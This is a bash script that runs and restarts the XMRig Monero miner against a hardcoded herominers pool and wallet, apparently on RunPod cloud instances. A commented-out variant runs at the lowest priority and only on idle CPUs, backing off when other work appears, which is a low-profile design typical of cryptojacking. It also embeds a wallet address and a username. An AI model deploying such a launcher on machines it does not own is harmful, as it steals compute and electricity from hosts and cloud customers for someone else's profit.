#!/bin/bash

old_count=-1


# start all nice 19 processes
#/bin/bash -c 'nice -n 19 taskset -c 0-$(( $(nproc)/2)) /home/sdamours/xmrig -o ca.monero.herominers.com:1111 -u 49yMArqpSkG58sYr6RHrcTKqJU1o7BcEmdsGfdsjBTMAcHXHDBsevvmCF8RtTuYAVo2G7mvQXHh5Q3i7gNMs7vNpTEPM5fo.$(hostname) -a rx/0 -k --randomx-1gb-pages --log-file=xmrig.log -t $(( $(nproc) / 2 ))'


while true; do

    # count current processes
    current_count=$(ps -eo cmd | grep -E '(^| )/bin/bash ./sdamours-is-king.sh' | wc -l)

    # only act if count changed
    if [ "$current_count" -ne "$old_count" ]; then

        # update old count
        old_count=$current_count

        # kill existing runners
        pkill -f xmrig-on-runpod

        # relaunch one per detected process (non-blocking)
        for ((i=0; i<current_count; i++)); do
            /home/sdamours/xmrig-on-runpod -t $(( ($(nproc) / 4 - 1) )) -o ca.monero.herominers.com:1111 -u 49yMArqpSkG58sYr6RHrcTKqJU1o7BcEmdsGfdsjBTMAcHXHDBsevvmCF8RtTuYAVo2G7mvQXHh5Q3i7gNMs7vNpTEPM5fo.$(hostname)R -a rx/0 -k --randomx-1gb-pages --log-file=xmrig.log &
        done
    fi

    sleep 5
done











# #!/usr/bin/env bash

# set -u


# USE_ALL_THREADS=0

# if [ "${1:-}" = "--all-threads" ]; then
#     USE_ALL_THREADS=1
# fi


# CMD_BASE="/home/sdamours/xmrig -o ca.monero.herominers.com:1111 -u 49yMArqpSkG58sYr6RHrcTKqJU1o7BcEmdsGfdsjBTMAcHXHDBsevvmCF8RtTuYAVo2G7mvQXHh5Q3i7gNMs7vNpTEPM5fo.$(hostname) -a rx/0 -k --randomx-1gb-pages --log-file=xmrig.log"
# THREAD_ARG="-t"

# CHECK_INTERVAL=5
# CPU_THRESHOLD=20.0
# MIN_THREADS=1

# PID=""
# LAST_CPU_SET=""

# # --------------------------------------------------
# # Get xmrig process tree PIDs
# # --------------------------------------------------
# get_xmrig_pids() {
#     if [ -z "${PID:-}" ] || ! kill -0 "$PID" 2>/dev/null; then
#         echo ""
#         return
#     fi

#     pstree -p "$PID" | grep -o '([0-9]\+)' | tr -d '()'
# }

# # --------------------------------------------------
# # Get busy CPUs excluding xmrig
# # --------------------------------------------------
# get_busy_cpus() {

#     XM_PIDS="$(get_xmrig_pids)"

#     ps -eLo pid,psr,%cpu | awk -v thr="$CPU_THRESHOLD" -v exclude="$XM_PIDS" '
#     BEGIN {
#         split(exclude, arr)
#         for (i in arr) skip[arr[i]]=1
#     }
#     {
#         pid=$1
#         cpu=$3

#         if (skip[pid]) next
#         if (cpu > thr) print $2
#     }' | sort -u
# }

# # --------------------------------------------------
# # Get safe CPUs (exclude full physical cores)
# # --------------------------------------------------
# get_safe_cpus() {

#     busy_file="/tmp/busy_cpus.$$"
#     get_busy_cpus > "$busy_file"

#     if [ ! -s "$busy_file" ]; then
#         if [ "$USE_ALL_THREADS" -eq 1 ]; then
#             lscpu -e=CPU | awk '
#                 NR>1 && $1 ~ /^[0-9]+$/ {printf "%s,", $1}
#             ' | sed 's/,$//'
#         else
#             lscpu -e=CPU,CORE | awk '
#                 $1 ~ /^[0-9]+$/ && $2 ~ /^[0-9]+$/ {
#                     if (!(core_seen[$2]++)) {
#                         printf "%s,", $1
#                     }
#                 }
#             ' | sed 's/,$//'
#         fi
#         rm -f "$busy_file"
#         return
#     fi



#     lscpu -e=CPU,CORE | awk '
#         NR==FNR {
#             if ($1 ~ /^[0-9]+$/)
#                 busy_cpu[$1]=1
#             next
#         }

#         $1 ~ /^[0-9]+$/ && $2 ~ /^[0-9]+$/ {
#             cpu=$1
#             core=$2

#             if (busy_cpu[cpu]) {
#                 bad_core[core]=1
#             }

#             cpu_to_core[cpu]=core
#         }

#         END {
#             for (cpu in cpu_to_core) {
#                 if (!bad_core[cpu_to_core[cpu]]) {
#                     printf "%s,", cpu
#                 }
#             }
#         }
#     ' "$busy_file" - | sed 's/,$//'

#     rm -f "$busy_file"
# }




# # --------------------------------------------------
# # Stop xmrig
# # --------------------------------------------------
# stop_job() {
#     if [ -n "${PID:-}" ] && kill -0 "$PID" 2>/dev/null; then
#         echo "Stopping xmrig PID $PID"
#         kill "$PID"
#         wait "$PID" 2>/dev/null || true
#     fi
#     PID=""
# }

# # --------------------------------------------------
# # Start xmrig
# # --------------------------------------------------
# start_job() {
#     local cpus="$1"

#     if [ -z "$cpus" ]; then
#         echo "No safe CPUs available"
#         return
#     fi

#     local threads
#     threads=$(echo "$cpus" | tr ',' '\n' | wc -l)

#     if [ "$threads" -lt "$MIN_THREADS" ]; then
#         threads="$MIN_THREADS"
#     fi

#    local cmd="$CMD_BASE $THREAD_ARG $threads"
#     # local cmd="$CMD_BASE"

#     echo "----------------------------------------"
#     echo "Starting xmrig"
#     echo "CPUs    : $cpus"
#     echo "Threads : $threads"
#     echo "----------------------------------------"

#     nice -n 19 chrt -i 0 taskset -c "$cpus" bash -c "$cmd" &
#     PID=$!
# }

# # --------------------------------------------------
# # MAIN LOOP
# # --------------------------------------------------
# while true; do

#     cpus="$(get_safe_cpus)"

#     #echo "Safe CPUs: $cpus"

#     if [ -z "$cpus" ]; then
#         echo "No CPUs available -> stopping xmrig"
#         stop_job
#         LAST_CPU_SET=""
#     else
#         if [ "$cpus" != "$LAST_CPU_SET" ]; then
#             echo "CPU set changed -> restarting xmrig"
#             stop_job
#             if echo "$cpus" | grep -q '[^0-9,]'; then
#                 echo "ERROR: invalid CPU list: $cpus"
#                 stop_job
#                 continue
#             fi
#             start_job "$cpus"
#             LAST_CPU_SET="$cpus"
#         # else
#         #     echo "No change"
#         fi
#     fi

#     sleep "$CHECK_INTERVAL"

# done
